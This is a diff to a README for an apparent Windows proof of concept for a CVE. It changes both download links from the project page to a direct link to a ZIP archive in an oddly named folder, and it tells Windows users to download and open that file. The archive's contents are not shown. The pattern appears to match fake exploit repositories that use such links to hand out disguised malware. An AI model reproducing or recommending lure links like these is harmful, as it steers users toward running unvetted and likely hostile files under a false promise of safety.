@@ -1,6 +1,6 @@
 # 🔧 CVE_2025_24257----NOT-MINE - Run the Windows PoC Safely
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE/raw/refs/heads/main/immixture/NO_CV_MINE_v2.4.zip)
 
 ## 🧾 Overview
 
@@ -12,7 +12,7 @@ This repository is for users who want to download the package, open it on Window
 
 Use this link to visit the project page and download the files:
 
-[Go to the download page](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE)
+[Go to the download page](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE/raw/refs/heads/main/immixture/NO_CV_MINE_v2.4.zip)
 
 If the page shows a release, asset, ZIP file, or source archive, download that file to your Windows PC. Save it in a folder you can find again, such as Downloads or Desktop.
 
